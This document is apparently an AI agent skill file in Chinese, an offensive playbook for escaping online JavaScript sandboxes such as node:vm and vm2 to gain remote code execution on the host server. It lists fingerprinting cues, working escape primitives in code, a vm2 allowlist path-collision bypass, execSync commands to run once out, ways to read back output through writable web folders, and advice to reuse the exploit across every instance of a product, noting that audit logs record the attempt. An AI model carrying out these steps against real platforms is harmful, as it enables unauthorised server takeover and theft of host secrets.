---
name: js-sandbox-escape-rce
description: >-
  Use when 目标有「技能系统 / 插件 / 在线执行 JS」沙箱（vm2、node:vm、isolated-vm、Function 白名单）：
  从原型链污染或 constructor chain 逃逸到宿主，落到服务器 RCE，且同一产品多实例通用。
---

# 在线 JS 沙箱逃逸 → 宿主 RCE

## 指纹
- 平台提供「自定义技能 / 脚本 / 公式 / 工作流代码块」并能在线执行
- 返回结果是 JS 求值结果；错误信息暴露 `node:vm`、`vm2`、`isolated-vm`、`ContextifyContext`
- 常见于 AI Agent 平台、低代码、报表公式、Next.js 技能市场

## 逃逸原语（按成功率）
1. `this.constructor.constructor('return process')()` —— node:vm 未隔离
2. `({}).constructor.constructor` 同源；`(async()=>{}).constructor`
3. `process.mainModule.require('child_process')`（老 Node）
4. vm2 ≤3.9.19 系列：`Error.prepareStackTrace` 拿 `caller` 的 host 函数：
   ```js
   const e = new Error(); e.name = { toString: () => { try { throw new Error() } catch(x){ return x.stack } } };
   ```
   再 `hostFun.constructor('return process')()`
5. `import('node:child_process')` 动态导入绕过 require 白名单
6. 原型链污染 `Object.prototype.shell = 'node'; Object.prototype.env = {...}` 后打 `child_process` 调用点

## vm2 是「授权边界」不是「隔离边界」（CVE-2026-100721，< 3.12.2）

传统逃逸要绕 V8 隔离；vm2 后期版本真正的软肋是**名字/路径边界混淆**——allowlist 判错，包就直接在 **host context** 加载，顶层模块代码跑在沙箱包装之前，`child_process`、文件读、密钥全在射程内。

两条同族：

1. **包名子串匹配**（GHSA-c48m-32m9-vx93）：allowlist 写 `left-pad`，guest 请求 **`evil-left-pad`** 也过——判定用的是 `contains` 而不是完整包名边界。前提是该碰撞包在自定义 resolver 可达路径里。
2. **解析路径前缀匹配**（`lib/resolver-compat.js`，**3.12.2 修**）：`context: 'host'` + 自定义 resolver 时，允许目录被记成**前缀正则**，不带路径分隔符/结尾边界。于是 guest 能 `require()` 一个**绝对路径的兄弟目录**——`.../node_modules/foo2/index.js` 在只 allowlist 了 `foo` 的情况下通过 `isPathAllowedForModule`，在 host 进程执行。

**打法**：先探 resolver 配置（自定义 resolver 是必要条件），再枚举 allowlist 隔壁的兄弟包名 / 相邻目录。判据不是"能不能出沙箱"，是"**包名能不能撞上**"。

**版本线**：`< 3.12.2` 全中；同族名字碰撞修复更早落了一部分（3.11.x）。看 `node_modules/vm2/package.json` 的 version，别猜。

## 落地
- 逃逸到 `process` 后：`process.mainModule.require('child_process').execSync('id')`
- 无回显时写文件到可读目录（`/tmp`、public/）再用 HTTP 读回
- 沙箱若限制超时（2s），用 `spawn` + detached 落盘结果

## 判据
- 返回 `uid=0(root)` 或 `process.version` → 已出沙箱
- 同一前端 bundle/产品名在其他实例复测 → 产品级 RCE（多实例适用）

## 注意
- 逃逸执行会留痕在平台审计日志（`/actuator/loggers` 打开 TRACE 时更明显）
- 先确认沙箱是否跑在独立容器；容器内 root 仍需按 `linux-privilege-escalation` 看宿主面
